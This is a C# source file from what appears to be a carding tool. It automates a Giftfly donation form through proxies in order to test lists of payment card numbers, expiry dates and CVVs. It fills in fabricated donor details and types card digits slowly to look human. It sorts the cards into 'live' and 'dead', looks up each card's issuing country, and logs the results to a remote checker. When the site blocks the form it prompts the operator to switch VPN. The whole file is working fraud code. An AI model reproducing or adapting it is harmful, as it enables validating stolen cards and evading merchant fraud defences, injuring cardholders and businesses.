using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using gateBeta.gates;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using Keys = OpenQA.Selenium.Keys;

namespace gateDanny.gates
{
    class Giftfly
    {
        check check = new check();
        Socks socks = new Socks();
        ChromeDriver driver;
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        string error = "";
        private readonly Random _random = new Random();

        public string checkbin(string bin)
        {

            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                //MessageBox.Show(jsonString);
                dynamic cc = JsonConvert.DeserializeObject(jsonString);
                return cc.country.name;
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }
        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 30)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        public void load()
        {
            var lines = Form1.listCC.Lines.Count();
            if (lines > 0)
            {


                var chromeOptions = new ChromeOptions();
                correo = "joseffernana" + getNum() + "@gmail.com";
                clave = "Jo." + getNum();

                //Proxy proxy = new Proxy();
                //proxy.Kind = ProxyKind.Manual;
                //proxy.IsAutoDetect = false;
                //proxy.HttpProxy =
                //proxy.SslProxy = "127.0.0.1:3330";
                //chromeOptions.Proxy = proxy;

                //chromeOptions.AddArguments(new List<string>() { "headless" });
                //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, "--headless"
                chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito", "--proxy-server=" + socks.proxy(), "ignore-certificate-errors");

                var chromeDriverService = ChromeDriverService.CreateDefaultService();
                chromeDriverService.HideCommandPromptWindow = true;

                driver = new ChromeDriver(chromeDriverService, chromeOptions);
                try
                {
                    driver.Url = "https://www.giftfly.com/shop/danny";
                    //driver.Url = "https://whatismyipaddress.com/es/mi-ip";
                }
                catch (Exception)
                {

                    restart();
                }

                Thread.Sleep(2000);
                Form1.circularProgressBar1.Value = 10;
                correo = "joseffernana" + getNum() + "@hotmail.com";


                if (IsElementPresent(By.XPath("/html/body/div[2]/div/div[1]/div[2]/span")))
                {
                    if (driver.FindElement(By.XPath("/html/body/div[2]/div/div[1]/div[2]/span")).Displayed == true)
                    {
                        if (driver.FindElement(By.XPath("/html/body/div[2]/div/div[1]/div[2]/span")).Text.Trim() == "Access to the donation form has been temporarily blocked.")
                        {
                            MessageBox.Show("CAMBIAR DE VPN");
                            this.stop();
                        }
                    }
                }


                if (tiempoElemento(By.Id("edit-amount")))
                {
                    Form1.circularProgressBar1.Value = 30;
                    driver.FindElement(By.Id("edit-amount")).SendKeys("7");
                    driver.FindElement(By.Name("email")).SendKeys(correo);
                    driver.FindElement(By.Name("first")).SendKeys("JOSE");
                    driver.FindElement(By.Name("last")).SendKeys("REYES");
                    Thread.Sleep(500);
                    var country = new SelectElement(driver.FindElement(By.Name("country")));
                    country.SelectByValue("US");
                    Thread.Sleep(500);
                    driver.FindElement(By.Name("agreement")).Click();
                    Thread.Sleep(500);
                    driver.FindElement(By.Id("edit-next")).Click();
                }
                else
                {
                    restart();
                }


                Thread.Sleep(500);
                if (tiempoElemento(By.XPath("//*[@id='edit-stripe-card-element']/div/iframe")))
                {
                    Form1.circularProgressBar1.Value = 60;
                    driver.SwitchTo().Frame(driver.FindElement(By.XPath("//*[@id='edit-stripe-card-element']/div/iframe")));
                    pago();
                }
                else
                {
                    restart();
                }
            }
        }


        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(1000);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {
            driver.Close();
            driver.Quit();
            pagos = 0;
            load();
        }

        private void pago()
        {
            try
            {
                var lines = Form1.listCC.Lines.Count();


                if (lines > 0)
                {
                    if (pagos < 5)
                    {
                        string cc = Form1.listCC.Lines[0];
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];

                        Form1.circularProgressBar1.Value = 80;

                        for (var i = 0; i <= ccnum.Length - 1; i++)
                        {
                            driver.FindElement(By.Name("cardnumber")).SendKeys(ccnum[i].ToString());
                            Thread.Sleep(200);
                        }

                        Thread.Sleep(500);

                        var mes = driver.SwitchTo().ActiveElement();
                        mes.SendKeys(ccLine[1]);
                        Thread.Sleep(200);
                        var anio = driver.SwitchTo().ActiveElement();
                        anio.SendKeys(ccLine[2].Remove(0, 2));
                        Thread.Sleep(200);
                        var cvv = driver.SwitchTo().ActiveElement();
                        cvv.SendKeys(ccLine[3]);
                        Thread.Sleep(200);

                        try
                        {
                            Thread.Sleep(200);
                            var ZIP = driver.SwitchTo().ActiveElement();
                            ZIP.SendKeys("10001");
                            Thread.Sleep(200);
                        }
                        catch (Exception ex)
                        {

                            Console.WriteLine(ex);
                        }

                        Form1.circularProgressBar1.Value = 90;

                        driver.SwitchTo().ParentFrame();
                        Thread.Sleep(800);
                        driver.FindElement(By.Id("edit-stripe-button")).Click();
                        Thread.Sleep(3000);


                        if (confirmar())
                        {
                            Form1.circularProgressBar1.Value = 100;
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "lives");
                            Form1.textBox1.AppendText("live " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox1.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            Form1.circularProgressBar1.Value = 100;
                            Thread.Sleep(300);
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate; ;
                            check.ccss(Variables.key, guardar, "deads");
                            Form1.textBox2.AppendText("dead " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox2.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString());
                restart();
            }

        }

        public void stop()
        {
            pagos = 0;
            numeroTargeta = 0;
            driver.Close();
            driver.Quit();
        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 10)
                {


                    if (IsElementPresent(By.Id("edit-stripe-card-errors")))
                    {
                        if (driver.FindElement(By.Id("edit-stripe-card-errors")).Displayed == true)
                        {
                            if (driver.FindElement(By.Id("edit-stripe-card-errors")).Text.Trim() != "")
                            {
                                error = driver.FindElement(By.Id("edit-stripe-card-errors")).Text;
                                estado = "dead";
                            }
                            //else
                            //{
                            //    estado = "live";
                            //}
                        }
                    }
                    if (IsElementPresent(By.XPath("/html/body/div[2]/div/div[1]/div[2]/span")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/div[2]/div/div[1]/div[2]/span")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("/html/body/div[2]/div/div[1]/div[2]/span")).Text.Trim() == "Access to the donation form has been temporarily blocked.")
                            {
                                MessageBox.Show("CAMBIAR DE VPN");
                                this.stop();
                            }
                            //else
                            //{
                            //    estado = "live";
                            //}
                        }
                    }




                }
                else
                {
                    estado = "live";
                }

                tiempo++;
            }

            if (estado == "dead")
            {
                return false;
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }



        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }
    }
}
